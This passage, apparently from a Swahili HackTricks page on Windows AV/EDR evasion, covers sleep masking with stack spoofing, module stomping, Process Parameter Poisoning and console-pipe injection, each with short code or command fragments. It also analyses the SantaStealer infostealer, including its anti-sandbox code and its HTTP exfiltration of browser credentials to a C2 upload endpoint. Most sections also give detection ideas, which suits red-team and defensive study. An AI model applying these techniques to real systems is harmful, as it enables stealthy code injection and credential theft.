- Chagua thread nyingine ndani ya process hiyo hiyo na usome mipaka ya stack ya `NT_TIB` / TEB (`StackBase`, `StackLimit`) kupitia `NtQueryInformationThread`.
- Hifadhi nakala ya TEB/TIB halisi ya thread ya sasa.
- Nasa context halisi ya thread inayolala kwa `GetThreadContext`.
- Nakili **`Rip` halisi pekee** kwenye spoof context, huku hali ya `Rsp`/stack iliyospoofiwa ikiendelea kama ilivyo.
- Wakati wa kipindi cha sleep, nakili `NT_TIB` ya thread iliyospoofiwa kwenye TEB ya sasa ili stack walkers zifuatilie unwind ndani ya range halali ya stack.
- Baada ya wait kukamilika, rejesha TIB na thread context ya awali.

Hii huhifadhi instruction pointer inayolingana na CET huku ikipotosha EDR stack walkers zinazotegemea metadata ya TEB stack ili kuthibitisha unwinds.

### Njia mbadala ya APC: Kraken Mask

Ikiwa timer-queue dispatch ina saini inayotambulika mno, mfuatano uleule wa sleep-encrypt-spoof-restore unaweza kutekelezwa kutoka kwa helper thread iliyosimamishwa kwa kutumia queued APCs:<sup>[[27]](#references)</sup>

- Unda helper thread yenye `NtTestAlert` kama entrypoint.
- Panga `CONTEXT` frames/APCs zilizotayarishwa kwa `NtQueueApcThread` na uzitekeleze kwa `NtAlertResumeThread`.
- Hifadhi hali ya chain kwenye heap badala ya stack ya helper ili kuepuka kumaliza thread stack ya kawaida ya 64 KB.
- Tumia `NtSignalAndWaitForSingleObject` kutoa ishara ya kuanza na kusubiri kwa wakati mmoja.
- Simamisha main thread kabla ya kurejesha TIB/context (`NtSuspendThread` → restore → `NtResumeThread`) ili kupunguza kipindi cha race ambapo scanner inaweza kunasa stack ambayo haijarejeshwa kikamilifu.

Hii hubadilisha saini ya `CreateTimerQueueTimer` + `NtContinue` na kutumia saini ya helper-thread/APC, huku ikiendeleza malengo yaleyale ya RC4 masking na stack-spoofing.

Mawazo ya ziada ya utambuzi
- `NtSetInformationVirtualMemory` yenye `VmCfgCallTargetInformation` muda mfupi kabla ya sleeps, waits au APC dispatch.
- `GetThreadContext`/`SetThreadContext` zinazotumika pamoja na `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` au `ConnectNamedPipe`.
- `NtQueryInformationThread` ikifuatiwa na writes za moja kwa moja kwenye mipaka ya stack ya TEB/TIB ya thread ya sasa.
- Chains za `NtQueueApcThread`/`NtAlertResumeThread` zinazoelekeza kwa njia isiyo ya moja kwa moja kwenye `SystemFunction032`, `VirtualProtect` au helpers za kurejesha ruhusa za sections.
- Matumizi yanayojirudia ya gadget signatures fupi kama `FF 23` (`jmp [rbx]`) au `FF E7` (`jmp rdi`) kama dispatch pivots ndani ya modules zilizosainiwa.


## Module Stomping ya Usahihi

Module stomping hutekeleza payloads kutoka kwenye **`.text` section ya DLL ambayo tayari imemapishwa ndani ya target process** badala ya kutenga memory binafsi inayoweza kutambulika kwa urahisi au kupakia DLL mpya ya kutumika kama mhanga. Target ya overwrite inapaswa kuwa **image iliyopakiwa na inayotegemea diski** ambayo code space yake inaweza kutosheleza payload bila kuharibu code paths ambazo process bado inahitaji.<sup>[[1]](#references)[[2]](#references)</sup>

### Kuchagua target kwa kutegemewa

Stomping ya moja kwa moja kwenye modules za kawaida kama `uxtheme.dll` au `comctl32.dll` si ya kutegemewa: huenda DLL haijapakiwa kwenye remote process, na code region ikiwa ndogo mno itasababisha process ku-crash. Workflow inayotegemewa zaidi ni:

1. Orodhesha modules za target process na uhifadhi **include list yenye majina pekee** ya DLL zilizopakiwa tayari.
2. Tengeneza payload kwanza na urekodi **ukubwa wake halisi kwa bytes**.
3. Changanua DLL zinazoweza kutumika kwenye diski na ulinganishe PE section **`.text` `Misc_VirtualSize`** na ukubwa wa payload. Hili ni muhimu zaidi kuliko ukubwa wa file kwa sababu linaonyesha ukubwa wa executable section **inapomapishwa kwenye memory**.
4. Changanua **Export Address Table (EAT)** na uchague RVA ya function iliyosafirishwa kama offset ya kuanzia stomping.
5. Kokotoa **blast radius**: ikiwa payload inazidi mpaka wa function iliyochaguliwa, ita-overwrite exports jirani zilizopangwa baada yake kwenye memory.

Helpers za kawaida za recon/uchaguzi zinazoonekana kwenye matumizi halisi:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Vidokezo vya kiutendaji
- Pendelea DLL ambazo **tayari zimepakiwa** katika process ya mbali ili kuepuka telemetry ya `LoadLibrary`/upakiaji wa picha usiotarajiwa.
- Pendelea exports ambazo programu lengwa huzitekeleza mara chache; vinginevyo, njia za kawaida za code zinaweza kufikia bytes zilizobadilishwa kabla au baada ya kuundwa kwa thread.
- Implants kubwa mara nyingi huhitaji kubadilisha uingizaji wa shellcode kutoka string literal hadi **byte-array/braced initializer** ili buffer nzima iwakilishwe ipasavyo katika source ya injector.

Mawazo ya kutambua
- Uandishi wa mbali ndani ya kurasa zinazoweza kutekelezeka na zinazoungwa mkono na image (`MEM_IMAGE`, `PAGE_EXECUTE*`), badala ya allocations za kawaida zaidi za private RWX/RX.
- Entry points za export ambazo bytes zake zilizo kwenye memory hazilingani tena na faili husika iliyo kwenye diski.
- Remote threads au context pivots zinazoanza kutekeleza ndani ya export halali ya DLL ambayo bytes zake za mwanzo zimebadilishwa hivi majuzi.
- Mfuatano wa kutiliwa shaka wa `VirtualProtect(Ex)` / `WriteProcessMemory` dhidi ya kurasa za `.text` za DLL, ukifuatiwa na uundaji wa thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) ni mbinu ya **process-injection / EDR-evasion** inayokwepa njia ya kawaida ya uandishi wa mbali (`VirtualAllocEx` + `WriteProcessMemory`). Badala ya kunakili bytes ndani ya target inayoendesha tayari, hutumia ukweli kwamba Windows **hunakili baadhi ya vigezo vya kuanzisha vya `CreateProcessW` ndani ya child process** na kuvihifadhi ndani ya `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Carriers zinazoweza kuwekewa sumu na kunakiliwa na `CreateProcessW`

Carriers zinazofaa ni:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (pamoja na `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Vikwazo vya carriers kwa matumizi ya vitendo:

- `lpCommandLine` lazima ielekeze kwenye **memory inayoweza kuandikwa** kwa `CreateProcessW`, na ina kikomo cha **herufi 32,767 za Unicode** pamoja na null terminator.
- `lpEnvironment` lazima iwe environment block ya Unicode yenye mfuatano wa `NAME=VALUE\0` unaofuatana na unaomalizika kwa `\0` ya ziada.
- `lpReserved` imehifadhiwa rasmi, kwa hiyo mapping ya `ShellInfo` inapaswa kuchukuliwa kama maelezo ya utekelezaji badala ya mkataba thabiti ulioandikwa rasmi.

Hii hugeuza uundaji wa kawaida wa process kuwa **primitive ya kuhamisha payload**. Operator huunda child process kwa data ya kuanzisha inayodhibitiwa na mshambulizi na kuiacha Windows ifanye nakala kati ya processes.

### Mchakato wa kutafuta kwa mbali bila API za uandishi wa mbali

Baada ya child kuundwa, tafuta buffer iliyonakiliwa kwa kutumia primitives za **kusoma tu**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → pata `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Soma `PEB` ya mbali
3. Fuata `PEB.ProcessParameters`
4. Soma `RTL_USER_PROCESS_PARAMETERS`
5. Tumia pointer iliyochaguliwa:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Mchakato wa chini kabisa:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Kutekeleza buffer ya parameter iliyonakiliwa

Eneo la parameter lililonakiliwa kwa kawaida huwa `RW`, si la kutekelezeka. Mlolongo wa kawaida wa P3 ni:

1. Unda process kwa kawaida (bila kuisimamisha)
2. Fanya ukurasa wa parameter uliochaguliwa utekelezeke kwa `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Tumia tena handle ya main thread ambayo tayari imerudishwa katika `PROCESS_INFORMATION`
4. Elekeza utekelezaji kwa `NtSetContextThread` (`CONTEXT_CONTROL`, badilisha `RIP`)

Tofauti na taratibu za kawaida za thread hijacking, hili **halihitaji** `SuspendThread` / `ResumeThread`; context inaweza kubadilishwa moja kwa moja kwa kutumia handle ya main thread iliyorudishwa.

Hili huepuka API kadhaa ambazo kwa kawaida hufuatiliwa kwa ajili ya injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- mara nyingi pia `SuspendThread` / `ResumeThread`

### Kizuizi cha byte null na shellcode ya hatua kwa hatua

Njia zote tatu za kubeba payload ni data za **string au zinazofanana na string**, kwa hivyo payload ghafi yenye `0x00` hukatwa wakati wa uhamishaji. Suluhisho la vitendo ni kutumia **hatua ya kwanza isiyo na null** inayounda upya constants wakati wa utekelezaji, kisha kupakia hatua ya pili yoyote.

Muundo rahisi ni usanisi wa constant unaotumia XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Hii huruhusu hatua ya kwanza kujenga strings za stack, hoja za API, njia za DLL, au loader ya shellcode ya hatua ya pili bila kuweka null bytes ndani ya parameter inayosafirishwa.

### Stack-based API calls kutoka hatua ya kwanza

Wakati hatua ya kwanza lazima iite API kama vile `LoadLibraryA`, inaweza:

- kusukuma string/buffer kwenye stack ya lengo
- kuhifadhi **nafasi ya shadow ya x64 yenye byte 32**
- kuweka `RCX`, `RDX`, `R8`, `R9` kuwa constants au pointers zinazohusiana na `RSP`
- kuhakikisha `RSP` imepangiliwa kwa **byte 16** kabla ya kuita API

Hatua ya pili inaweza kunakiliwa kutoka stack hadi kwenye allocation ya `PAGE_READWRITE`, kubadilishwa kuwa `PAGE_EXECUTE_READ` kwa `VirtualProtect`, kisha kurukia humo, hivyo kuepuka allocation ya moja kwa moja ya RWX.

### Mawazo ya utambuzi

Fursa nzuri za uchunguzi zilizotajwa na waandishi:

- `VirtualProtectEx` / `NtProtectVirtualMemory` kubadilisha **kurasa za process-parameter kuwa executable**
- mabadiliko hayo ya ulinzi yakifuatiwa na `SetThreadContext` / `NtSetContextThread`
- usomaji wa mbali wa `PEB` na kisha `RTL_USER_PROCESS_PARAMETERS`
- thamani za `lpCommandLine`, `lpEnvironment`, au `STARTUPINFO.lpReserved` zilizo ndefu isivyo kawaida / zenye entropy ya juu wakati wa kuunda process

### Maelezo

- P3 ni **mbinu ya kuhamisha data kati ya process**, si primitive kamili ya utekelezaji yenyewe: parameter iliyonakiliwa bado inahitaji kubadilishwa ruhusa zake kuwa za utekelezaji na njia ya kuelekeza utekelezaji.
- Waandishi walizingatia `RtlCreateProcessReflection` / Dirty Vanity lakini wakaikataa kwa sababu ndani yake hufikia primitives zenye mashaka kama vile `NtWriteVirtualMemory` na `NtCreateThreadEx`.

## Console STDIN pipe injection

Child ya console inayoingiliana pia inaweza kutumiwa kama **primitive ya kuhamisha payload**. Injector huelekeza ingizo la kawaida la child kwenye pipe na kutuma marker ikifuatiwa na shellcode. Baada ya programu ya console kusoma data kwenye memory yake binafsi, injector hutafuta buffer hiyo, kuifanya executable na kuelekeza thread ya child humo. Hii huepuka `VirtualAllocEx` na `WriteProcessMemory`, lakini bado ni process injection badala ya mbinu ya jumla ya kukwepa EDR.<sup>[[41]](#references)</sup>

Licha ya maelezo ya "named-pipe", implementation ya rejea huita `CreatePipe`, ambayo huunda **anonymous pipe**. Windows hutekeleza anonymous pipes kwa kutumia pipe objects zenye majina ya kipekee ndani ya mfumo, lakini PoC haichagui njia ya `\\.\pipe\<name>` wala kuita `CreateNamedPipe`. Huunda handles zinazoweza kurithiwa kwa kutumia security descriptor chaguomsingi, huweka handle ya kusoma kwenye `STARTUPINFO.hStdInput`, huweka `STARTF_USESTDHANDLES`, na kuwasha child mpya huku urithishaji wa handle ukiwa umewashwa. Kwa hiyo, PoC hii huwasha console executable iliyotolewa; haiunganishi pipe yake kwenye process iliyopo.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Mtiririko wa kazi wa rejea

Implementation hutumia mnyororo ufuatao:<sup>[[41]](#references)</sup>

1. Unda jozi za anonymous pipe kwa `STDIN` na `STDOUT` za child. Zima urithishaji kwenye handles mbili za upande wa parent na ufunge nakala za upande wa child kwenye parent baada ya kuunda process.
2. Washa executable inayoingiliana kama `netsh.exe` au `nslookup.exe` kwa kutumia `CREATE_NEW_CONSOLE`. Child hurithi standard handles zilizoelekezwa upya.
3. Tuma array kamili ya binary ya `rawData` kwa `WriteFile` kupitia handle ya `STDIN` ya upande wa parent. Programu ya console hutumia byte hizo na kuacha nakala katika mojawapo ya maeneo yake binafsi yaliyotengewa memory.
4. Pitia nafasi ya anwani ya child kwa `VirtualQueryEx`, soma maeneo teule ya `MEM_PRIVATE` kwa `ReadProcessMemory`, na utafute marker mwanzoni mwa `rawData`.
5. Badilisha buffer iliyogunduliwa kuwa `PAGE_EXECUTE_READWRITE` kwa `VirtualProtectEx`.
6. Tambua thread kuu, isimamishe, weka `RIP` kuwa `found_address + 0x19` kwa `NtSetContextThread`, kisha iwashe tena.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Utekelezaji uliotolewa ni mahususi kwa x64: hurekebisha `CONTEXT.Rip`, na payload yake iliyopachikwa ni shellcode ya x64. `rawData` huanza na alama ya baiti 25, kwa hivyo baiti zinazoweza kutekelezwa huanza kwenye offset ya heksadesimali `0x19`. Unapobadilisha payload, hifadhi mpangilio huo au usasishe alama, search vector, ukubwa wa array na offset ya utekelezaji kwa pamoja. Maoni kwenye chanzo pia yanaorodhesha `0x0A`, `0x0D` na `0x1A` kama herufi zisizoruhusiwa. Workflow hii haibadilishi tokeni au ruhusa za child process.<sup>[[41]](#references)</sup>

Kwa mifumo ya kuunda native helpers ndogo na payload, tazama [Payload za C za Windows](windows-local-privilege-escalation/windows-c-payloads.md).

## Mbinu za SantaStealer za Kukwepa Ugunduzi Bila Faili na Kuiba Credentials

SantaStealer (pia hujulikana kama BluelineStealer) inaonyesha jinsi info-stealers za kisasa zinavyounganisha AV bypass, anti-analysis na ufikiaji wa credentials katika workflow moja.<sup>[[24]](#references)</sup>

### Udhibiti kulingana na mpangilio wa kibodi na kuchelewesha sandbox

- Alama ya usanidi (`anti_cis`) huorodhesha mipangilio ya kibodi iliyosakinishwa kupitia `GetKeyboardLayoutList`. Ikiwa mpangilio wa kibodi wa Cyrillic utapatikana, sampuli huunda alama tupu ya `CIS` na kusitisha kabla ya kuendesha stealers, hivyo kuhakikisha kuwa haiwahi kujilipua katika maeneo yaliyotengwa huku ikiiacha artifact inayoweza kutafutwa.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Mantiki ya `check_antivm` yenye tabaka nyingi

- Variant A hupitia orodha ya process, huhash kila jina kwa checksum maalum ya rolling, na kulilinganisha na orodha zilizopachikwa za debugger/sandbox; hurudia checksum kwenye jina la kompyuta na hukagua saraka za kazi kama `C:\analysis`.
- Variant B hukagua sifa za mfumo (kizingiti cha chini cha idadi ya process, muda mfupi tangu kuwashwa upya), huita `OpenServiceA("VBoxGuest")` ili kugundua VirtualBox additions, na hukagua muda unaochukuliwa kabla na baada ya kulala ili kubaini single-stepping. Gunduzi lolote husitisha utekelezaji kabla modules hazijazinduliwa.

### Helper isiyo na faili + upakiaji wa reflective wa ChaCha20 mara mbili

- DLL/EXE kuu hujumuisha Chromium credential helper ambayo huandikwa kwenye diski au huwekwa mwenyewe kwenye memory; katika hali isiyo na faili, hutatua imports/relocations yenyewe ili kuepuka kuandika mabaki ya helper.
- Helper hiyo huhifadhi DLL ya hatua ya pili iliyosimbwa mara mbili kwa ChaCha20 (funguo mbili za baiti 32 + nonces za baiti 12). Baada ya kufungua usimbaji wa tabaka zote mbili, huipakia blob kwa reflective loading (bila `LoadLibrary`) na kuita exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` zilizotokana na [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Routines za ChromElevator hutumia reflective process hollowing kupitia direct-syscall ili kuingiza kwenye Chromium browser inayotumika, kurithi funguo za AppBound Encryption, na kufungua usimbaji wa passwords/cookies/credit cards moja kwa moja kutoka kwenye SQLite databases licha ya uimarishaji wa ABE.

### Ukusanyaji wa moduli ndani ya memory na uchujaji wa data kwa HTTP katika vipande

- `create_memory_based_log` hupitia jedwali la kimataifa la function-pointer `memory_generators` na kuanzisha thread moja kwa kila module iliyowezeshwa (Telegram, Discord, Steam, screenshots, documents, browser extensions, n.k.). Kila thread huandika matokeo kwenye shared buffers na kuripoti idadi ya faili baada ya muda wa kusubiri wa takriban sekunde 45.
- Baada ya kukamilika, kila kitu hubanwa kwa kutumia maktaba ya `miniz` iliyounganishwa kwa statically kama `%TEMP%\\Log.zip`. Kisha `ThreadPayload1` hulala sekunde 15 na kutuma archive kwa HTTP POST katika vipande vya MB 10 kwenda `http://<C2>:6767/upload`, huku ikijifanya kuwa browser kwa kutumia mpaka wa `multipart/form-data` (`----WebKitFormBoundary***`). Kila kipande huongeza `User-Agent: upload`, `auth: <build_id>`, `w: <campaign_tag>` ya hiari, na kipande cha mwisho huongeza `complete: true` ili C2 ijue kuwa kuunganisha upya kumekamilika.

## References

- [1] [Mbinu za Kina za Kukwepa Ugunduzi: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blogu](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, hakuna tena kupita bure kwa malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – nyaraka](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – mfano](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – mfano](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC ya kudanganya call stack](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Msururu Mpya wa Maambukizi na Ufiche wa ConfuserEx kwa DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Je, unapaswa kuamini zero trust yako? Kukwepa ukaguzi wa Zscaler wa hali ya kifaa](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Kabla ya ToolShell: Kuchunguza Operesheni za Awali za Ransomware za Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Kutumia vibaya Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Orodha ya Forwarded Exports za Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Mpangilio wa utafutaji wa dynamic-link library](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Usalama wa process na haki za ufikiaji](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Marejeo ya EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Kizindua cha CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Kukabiliana na EDRs kwa Usaidizi wa Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Kuvunja Ganda la Ulinzi la Windows Defender kwa Mbinu ya Folder Redirect](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Marejeo ya amri ya mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Chini ya Pazia Safi: Kutoka RAT hadi Builder hadi Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer Anakuja Mjini: Infostealer Mpya na Yenye Matarajio Makubwa](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Kufungua Usimbaji wa Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Kushinda Malware ya Node.js kwa Ufuatiliaji wa API](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Mrembo Aliyelala: Kuilaza Adaptix kwa Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Uharibifu wa Vigezo vya Process](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Mrembo Aliyelala II: CFG, CET, na Udanganyifu wa Stack](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ufiche wa usingizi wa Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Kuficha Dotnet Etw Yako](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Kutumia Vibaya Chrome Remote Desktop Katika Operesheni za Red Team: Mwongozo wa Vitendo](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Imeundwa Upya: Kugeuza Driver ya Urekebishaji ya Defender kuwa Primitive ya Uendeshaji wa Kernel](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Msimbo saidizi wa MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Kuunda Functions Zinazojificha kwa Kutumia LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [Msimbo chanzo wa TwoSevenOneT - InjectSetConsole](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Function ya CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Kuunda Child Process yenye Ingizo na Matokeo Yaliyoelekezwa Upya](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
{{#include ../banners/hacktricks-training.md}}
